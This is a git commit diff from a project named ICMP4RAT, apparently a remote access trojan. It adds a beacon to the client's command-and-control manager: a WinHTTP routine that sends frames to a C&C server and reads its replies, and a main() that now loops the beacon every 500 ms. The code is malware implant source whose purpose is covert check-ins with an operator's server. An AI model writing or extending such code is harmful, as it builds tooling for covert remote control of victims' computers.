4ec0289e283440419d7524771c9bc5fe08caea47
jjanguu <tk3414@naver.com>
2022-05-04 16:37:06 +0900

    Add beacon

--- ICMP4RAT/ICMP4RAT/cncManager.cpp
+++ ICMP4RAT/ICMP4RAT/cncManager.cpp
@@ -27,37 +27,70 @@ cncManager::cncManager(LPCWSTR server) {
 }
 
 void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
-
-	if (hRequest)
-		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
-
-	if (this->bResults)
-		this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
 
 
-	if (!this->bResults)
-		std::cout << "Error" << GetLastError() << "has occurred." << std::endl;
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
 
-	if (this->bResults)
-		for (DWORD dwSize = 1; dwSize > 0;)
-		{
+    if (this->bResults)
+        this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);
 
-			LPSTR pszOutBuffer = new char[dwSize + 1];
-			if (!pszOutBuffer)
-			{
-				dwSize = 0;
-			}
-			else
-			{
-				ZeroMemory(pszOutBuffer, dwSize + 1);
 
-				DWORD dwDownloaded = 0;
-				WinHttpReadData(this->hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);
-				std::wcout << pszOutBuffer;
-			}
-		}
+    if (!this->bResults)
+        std::cout << "Error" << GetLastError() << "has occurred." << std::endl;
+
+    if (this->bResults)
+    {
+        do
+        {
+            // Check for available data.
+            
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+            {
+                printf("Error %u in WinHttpQueryDataAvailable.\n",
+                    GetLastError());
+                break;
+            }
+
+            // No more available data.
+            if (!dwSize)
+                break;
+
+            // Allocate space for the buffer.
+            LPSTR pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                printf("Out of memory\n");
+                break;
+            }
+
+            // Read the Data.
+            ZeroMemory(pszOutBuffer, dwSize + 1);
+
+            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                dwSize, &dwDownloaded))
+            {
+                printf("Error %u in WinHttpReadData.\n", GetLastError());
+            }
+            else
+            {
+                std::wcout << pszOutBuffer << std::endl;
+            }
+
+            // Free the memory allocated to the buffer.
+            delete[] pszOutBuffer;
+
+            // This condition should never be reached since WinHttpQueryDataAvailable
+            // reported that there are bits to read.
+            if (!dwDownloaded)
+                break;
+
+        } while (dwSize > 0);
+    }
 }
-
+ 
 void cncManager::sendBeacon() {
 	DDprotocol* beaconFrame = new DDprotocol;
 	beaconFrame->type = beaconRequest;
@@ -66,8 +99,7 @@ void cncManager::sendBeacon() {
 
 	while (TRUE) {
 		this->sendHttpRequest((LPVOID)beaconFrame, sizeof(DDprotocol));
-		//std::cout << "sss";
-		Sleep(10000);
+		Sleep(500);
 	}
 }
 
@@ -80,12 +112,7 @@ cncManager::~cncManager() {
 
 int main() {
 	cncManager client;
-	DDprotocol* dd = new DDprotocol;
-	dd->type = beaconRequest;
-	dd->len = 123;
-	dd->seq = 123;
-	client.sendHttpRequest((LPVOID)dd,sizeof(DDprotocol));
-	//client.sendBeacon();
 
-	delete dd;
+	client.sendBeacon();
+
 }
